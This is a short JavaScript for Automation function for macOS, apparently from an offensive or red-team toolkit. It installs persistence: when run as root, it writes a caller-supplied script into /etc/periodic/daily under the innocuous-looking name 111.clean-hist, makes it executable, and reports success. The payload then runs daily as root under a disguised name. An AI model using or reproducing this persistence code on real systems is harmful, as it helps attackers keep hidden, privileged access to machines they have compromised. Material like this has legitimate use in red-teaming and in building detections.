//Requires root
function PeriodicPersist(periodicJobaction){

ObjC.import('Foundation')
ObjC.import('stdlib')
var currentApp = Application.currentApplication();
currentApp.includeStandardAdditions = true;

var userName = currentApp.systemInfo().shortUserName
var output = ""
try{
if (userName != 'root')
{ 
	output += "Requires root"
} else
{

	function chmod(value, path) {
        let a = $({NSFilePosixPermissions:value})
        let p = $(path).stringByStandardizingPath
        let e = $()
        let r = $.NSFileManager.defaultManager
                .setAttributesOfItemAtPathError(a, p, e)
        return r
    }

var periodicFilepath = "/etc/periodic/daily/111.clean-hist"
function writeTextToFile(text, file, overwriteExistingContent) {
        var fileString = file.toString()
        var openedFile = currentApp.openForAccess(Path(fileString), { writePermission: true })
        if (overwriteExistingContent) {
            currentApp.setEof(openedFile, { to: 0 })
        }
        currentApp.write(text, { to: openedFile, startingAt: currentApp.getEof(openedFile) })
        currentApp.closeAccess(openedFile)
}
writeTextToFile(periodicJobaction, periodicFilepath, true)

chmod(0o755,periodicFilepath)
output += "Periodic Persistence installed at etc/periodic/daily/111.clean-hist"
}
}catch(error){
       output += error.toString()
		}
        	return output
}
